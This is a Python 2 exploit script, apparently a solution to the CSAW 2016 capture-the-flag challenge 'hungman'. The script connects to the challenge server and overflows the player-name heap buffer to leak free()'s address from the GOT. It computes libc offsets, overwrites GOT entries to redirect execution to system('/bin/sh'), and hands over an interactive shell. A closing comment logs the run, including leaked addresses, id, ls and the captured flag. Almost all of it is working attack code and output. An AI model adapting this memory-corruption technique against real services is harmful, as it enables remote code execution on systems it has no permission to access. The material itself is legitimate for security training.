#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string


# --------------------------------------------------------------------------------------------------
def recv_until(st):  # receive until you encounter a string
    ret = ""
    while st not in ret:
        ret += s.recv(8192)

    return ret

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('pwn.chal.csaw.io', 8003))
    #s = socket.create_connection(('localhost', 7777))
    f = s.makefile()                                # associate a file object with socket

    recv_until("What's your name?")                 # eat banner

    s.send( "A"*128 + "\n" )                        # set a big name
    recv_until( "\n" )

    print "[+] Winning the game once..."

    for c in string.ascii_lowercase:                # win the game
        s.send( c + "\n")
        recv_until( "\n" )

    s.send(' y\n')                                  # change username


    # -------------------------------------------------------------------------
    # first overflow: Arbitrary read
    # -------------------------------------------------------------------------
    ovfl  = "A" * 128                               # fill name
    ovfl += struct.pack("<Q", 0x1122334455667788)   # prevsize (heap meta)
    ovfl += struct.pack("<Q", 0x1122334455667788)   # size (heap meta)
    ovfl += struct.pack("<L", 0x200)                # score (must be >64) 
    ovfl += struct.pack("<L", 0x128)                # name length
    ovfl += struct.pack("<Q", 0x0000000000602018)   # address of .got.free()

    s.send( ovfl + "\n")

    r = recv_until("Continue? ")
    # print list(r)
    off  = r.find("Highest player: ") + len("Highest player: ")
    free = struct.unpack("<Q", r[off:off + 8])[0] & 0x0000ffffffffffff

    print "[+] Leaking address of free(): ", hex(free)


    '''
    Offsets from my libc:
        1349: 000000000003f510    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
        2230: 0000000000078890   146 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
        2116: 0000000000020610   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
        844:  00000000000817c0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5
        1880: 0000000000067dd0   518 FUNC    WEAK   DEFAULT   13 setvbuf@@GLIBC_2.2.5
    '''
    system     = free - (0x78890 - 0x3f510)
    libc_start = free - (0x78890 - 0x20610)
    memset     = free + (0x78890 - 0x817c0)
    setvbuf    = free - (0x78890 - 0x67dd0)

    '''
    Offsets from libc-2.23.so:
        1351: 0000000000045380    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5+
        2232: 0000000000083a70   460 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
        2118: 0000000000020740   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
    '''
    system     = free - (0x83a70 - 0x45380)
    libc_start = free - (0x83a70 - 0x20740)

    
    s.send(' y\n')                                  # play the game again
    recv_until("\n")

    for c in string.ascii_lowercase:                # win the game again
        s.send( c + "\n")
        print recv_until( "\n" ),

    print
    s.send(' y\n')                                  # change name again

    print "[+] free() at", hex(free)
    print "[+] system() at", hex(system)
    print "[+] __libc_start_main() at", hex(libc_start)
    print 
    print "[+] Overwriting GOT..."
    # -------------------------------------------------------------------------
    # second overflow: Arbitrary write to GOT
    # -------------------------------------------------------------------------
    # 0x400A2E contains a newline
    #
    # control flow:
    #   1. Overflow in memcpy() at 0x400EC4
    #   2. Hijack control during call to free() at 0400ED0
    #   3. go to .text:00400D0E call _puts
    #   4. go to .text:00400920 start proc near
    #   5. go to main()
    #
    #   SOLUTION A:
    #       6. call setvbuf()  (actually system)
    #
    #   SOLUTION B:
    #       6. call setvbuf() (make it idle; point to retn)
    #       7. call memset() (actuall system)
    #
    # Payload contains both solutions, but only one is used.
    # 
    ovfl  = struct.pack("<Q", 0x0000000000400D0E)   # free = .text:00400D0E call _puts
    ovfl += struct.pack("<Q", 0x0000000000400920)   # puts = .text:00400920 start proc near
    ovfl += "A"*8 *5                                # ignore these entries
    ovfl += struct.pack("<Q", system)               # memset = system
    ovfl += "B" * 8 * 2                             #
    ovfl += struct.pack("<Q", libc_start)           # recover __libc_start_main
    ovfl += "C" * 8 * 3                             #
    ovfl += struct.pack("<Q", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn
    ovfl += "D" * 8 * 3                             #
    ovfl += "/bin/sh\x00" + "E" * 16                # .data
    ovfl += struct.pack("<Q", 0x00) + "F" * 56      #
    ovfl += "/bin/sh\x00" + "G" * 8                 #
    ovfl += struct.pack("<Q", 0x00000000006020A8)   # .data:006020A8 = &/bin/sh

    s.send(ovfl + "\n")

    # -------------------------------------------------------------------------
    # get shell
    # ------------------------------------------------------------------------
    s.send( '`;')                                   # fix backtick problem

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/csaw_16# ./hungman_expl.py 
[+] Winning the game once...
[+] Leaking address of free():  0x7f9776b85a70
___a__________________________________________________a___________________________________________a__a______________________________a_____________a______________________________________________a_______________________________________________________________________________________________a_____
___a___________________b______________________________a___________________________________________a__a______b_______________________a__________bb_a___b____________________b___b_________________abb_____b_______b_____b_______________________________________b________b______________b_________ab____
___a_c___c__c_c________b______________________________a______c_____c______________________c_______a__a______b_______________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b_____b_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d___b_________________________dd___a_____dc___d_c_____________________dc_______a_da______b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d___b_________________________dd_e_a_____dce__d_c____________e________dc_______a_da_e____b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
___a_c___c__c_c____d__fb______f________________f_dd_e_a_____dce__d_c_____f____f_e________dc_______a_da_e____b____d_______________f__a____f_cc__bb_a___b_____c______________b___b___f_____________abb_____b_f__cf_b_f__db____f___________________ff_____________b__c_____b______________b_________ab____
___a_c___c__c_c____d__fb___gg_f_________g______f_dd_e_a_____dce__d_c_____f_gg_f_e________dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a___b_____c______________b_ggb___f__________g__abb_____b_f__cf_b_f__db____f______________g____ff_____________b__c_____b____________g_b______g__ab____
___a_c___c__c_c____d__fb___gg_f_________g__h__hf_dd_e_a_____dce__d_c_____f_gg_f_e_h______dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a_h_b_____c______________b_ggb___f__________g__abb____hb_f__cf_b_f__db___hf______________g_h__ff_h___________b__c____hb___h_______hg_b______g__ab____
___a_c___c__c_c____d__fb___gg_f_i_______g__h__hf_ddie_a___i_dce__d_c___i_f_gg_f_e_h______dc_____g_a_da_e__i_b_i__d_i_i_g_________f__a____f_cc__bb_a_h_b____ic____________i_b_ggb___f_______i__g__abb____hb_fi_cf_b_fi_db___hf______________g_h__ff_h______i___ib__c__i_hb___h_i_____hg_b___i__g_iab_i__
___a_c___c__c_c____d__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__d_cj__i_f_gg_f_e_h______dc_____gja_da_e__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_h_b____ic____________i_b_ggb___f_______i__g__abb_j__hb_fijcf_b_fi_db___hf______________g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
___a_c___c__c_c___kd__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcj__i_f_gg_f_e_h__k___dc_____gja_dake__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_hkb_k__ic____________i_b_ggb___f___k___i__g__abb_j__hb_fijcf_b_fi_db___hfk_____k___k___g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcjl_i_f_gg_f_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g____l____f__a____f_cc_jbb_a_hkb_k__icl__l_l______i_b_ggb___f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lk___k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_i__
___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hfmddie_a___i_dce__dkcjl_i_fmggmf_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g___ml_m__f__a____f_ccmjbb_a_hkb_k__icl__l_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lkm__k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
___a_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_i_dce__dkcjlni_fmggmf_e_h__k___dc____ngja_dakelnijb_i__d_i_i_g___mlnm__fn_a____f_ccmjbb_a_hkb_k__icl_nl_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkm__k___g_h__ff_h__jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
__oa_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_iodce__dkcjlniofmggmf_e_h__k___dc__o_ngja_dakelnijb_i__d_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l______i_boggbm__f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
__oapc___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_annpiodce__dkcjlniofmggmf_e_h__k__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l___p__i_boggbmp_f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji_______gqnh__hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_g_labb_jq_hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_hoqjj__in__ib_lc__i_hb__jh_i_____hg_b__qi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iogr_rmlnm_rfn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_grlabb_jq_hb_fijcfrb_fi_db___hfkn_n_lkmo_k__rg_h__ff_hoqjj__in_rib_lc__i_hb__jh_i____rhg_br_qi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkn_n_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqi_lgliaboimm
_qoapcq_qc__c_c___kd_lfbjjjggjfji__rrt__gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_eth_qkt_pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqitlgliaboimm
_qoapcq_qcu_c_c___kd_lfbjjjggjfji__rrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmf_eth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqq_k_u_io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosku_rg_h__ffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmfveth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqqvkvu_io_grlabb_jq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrg_h_vffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdc__oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkb_ksuicl_nl_lw__puqisboggbmpsfqqvkvu_io_grlabbwjq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrgwhwvffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
_qoapcqvqcu_cvcvx_kd_lfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkbxksuiclxnl_lwx_puqisboggbmpsfqqvkvu_ioxgrlabbwjq_hbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxrib_lc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
yqoapcqvqcu_cvcvxykdylfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnmyrfnwasqqofyccmjbboa_hkbxksuiclxnlylwxypuqisboggbmpsfqqvkvuyioxgrlabbwjqyhbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxribylc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
High score! change name?

[+] free() at 0x7f9776b85a70
[+] system() at 0x7f9776b47380
[+] __libc_start_main() at 0x7f9776b22740

[+] Overwriting GOT...
[+] Opening Shell...
    id
        uid=1000(hungman) gid=1000(hungman) groups=1000(hungman)
    ls -la
        total 36
        drwxr-x---  2 root hungman  4096 Sep 16 21:31 .
        drwxr-xr-x 10 root root     4096 Sep 16 21:31 ..
        -rw-r--r--  1 root hungman   220 Sep 16 21:31 .bash_logout
        -rw-r--r--  1 root hungman  3771 Sep 16 21:31 .bashrc
        -rw-r--r--  1 root hungman   655 Sep 16 21:31 .profile
        -rw-rw-r--  1 root root       41 Sep 16 21:13 flag.txt
        -rwxrwxr-x  1 root root    10464 Sep 16 21:13 hungman
    cat flag.txt
        flag{this_looks_like_its_a_well_hungman}
    exit
*** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
